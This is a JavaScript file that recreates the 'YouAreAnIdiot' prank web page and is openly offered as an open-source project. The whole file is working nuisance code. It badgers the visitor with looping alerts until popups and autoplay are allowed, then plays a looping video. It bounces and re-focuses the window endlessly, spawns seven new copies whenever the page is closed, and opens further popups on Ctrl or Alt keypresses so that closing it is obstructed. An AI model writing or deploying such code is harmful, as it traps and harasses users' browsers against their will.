var xOffset = 15;
var yOffset = 15;
var xPos = 50;
var yPos = -75;
async function bouncy(win) {
    while (true) {
    await new Promise(r => setTimeout(r, 5)); //wait a few ms so we dont *completely* crash. ;)
    xPos += xOffset;
    yPos += yOffset;
    if (xPos > screen.width-175){
        xOffset = Math.ceil( (6 * -1) * Math.random()) * 5 - 10 ;
        win.focus()
    }
    if (xPos < 0){
        xOffset = Math.ceil(8 * Math.random())  * 5 - 10 ;
    }
    if (yPos > screen.height-100){
        yOffset = Math.ceil( (6 * -1) * Math.random())  * 5 - 10 ;
    }
    if (yPos < 0){
        yOffset = Math.ceil( 8 * Math.random())  * 5 - 10 ;
    }
    try {
    win.moveTo(xPos,yPos);
    } catch {
    console.log("FEATURE NOT SUPPORTED: BOUNCY")
    }
    }
}

async function main() {

async function replicator() {
    window.open("index.html", "_blank",'location=no,height=200,width=200,scrollbars=yes,status=yes,toolbar=no')
}


async function replicate() {
    replicator()
    replicator()
    replicator()
    replicator()
    replicator()
    replicator()
    replicator()
}


document.addEventListener('keydown', function(e) {
    if (e.ctrlKey || e.altKey) {
        window.open("idiotlol.html", "_blank",'location=no,height=570,width=520,scrollbars=yes,status=yes,toolbar=no')
    }
});

window.onkeydown = function(e) {
    if (e.ctrlKey || e.altKey) {
        window.open("idiotlol.html", "_blank",'location=no,height=570,width=520,scrollbars=yes,status=yes,toolbar=no')
    }
}

window.addEventListener('beforeunload',(event) => {
    replicate()
})

}

async function changeHTMLToIdiot() {
    document.getElementsByTagName("body")[0].innerHTML = `<video src="thirdparty/idiot.mp4" autoplay="true" loop="true" width="100%" height="100%"></video>`
    main();
    try {
        bouncy(window)
    } catch {
        console.log("FEATURE NOT SUPPORTED: BOUNCY")
    }
}

function getAPPerm() {
    let audio = new Audio('empT.mp3');
    audio.play();
    audio.addEventListener('playing', perms("popups"));
    audio.addEventListener('error', ()=>{
        alert(`please allow all audio/video to autoplay on our site, as well as popups. please. (In this order: Autoplay, then PopUps, then press OK.) :-)`)
        getAPPerm()
    });
}

function getPopUpPerm() {
    let pu = window.open("popuppermmaker.html")
    if (pu == null || typeof(pu)=='undefined') { 	
        alert(`please allow all popups and autoplay for me please... (In this order: Autoplay, then PopUps, then press OK.) ;-)`)
        getPopUpPerm()
    } else {
        pu.close()
        changeHTMLToIdiot()
    }
}

function perms(perm) {
    if (perm == "autoplay") {
        getAPPerm()
    } else if (perm == "popups") {
        getPopUpPerm()
    }
}


var isChromium = window.chrome;
var winNav = window.navigator;
var vendorName = winNav.vendor;
var isOpera = typeof window.opr !== "undefined";
var isIEedge = winNav.userAgent.indexOf("Edg") > -1;
var isIOSChrome = winNav.userAgent.match("CriOS");

if (isIOSChrome) {
   // is Google Chrome on iOS
   document.getElementsByTagName("body")[0].innerHTML = `<h1>Get <a href="https://firefox.com">Firefox</a> on your desktop to use this.</h1>`
} else if(
  isChromium !== null &&
  typeof isChromium !== "undefined" &&
  vendorName === "Google Inc." &&
  isOpera === false &&
  isIEedge === false
) {
   // is Google Chrome
   document.getElementsByTagName("body")[0].innerHTML = `<h1>Get <a href="https://firefox.com">Firefox</a> for desktop to use this.</h1>`
} else { 
   // not Google Chrome 
   document.getElementsByTagName("body")[0].innerHTML = `<h1>Please allow the permissions to continue. :-)</h1>
<hr>
<h6>Fair warning: This is an open source, modern recreation of <a>YouAreAnIdiot (Offiz).</a> Licensed under the <a href="https://github.com/NodeMixaholic/OpenIdiotProject/blob/main/LICENSE">MIT License.</a></h6>`
}

perms("autoplay")
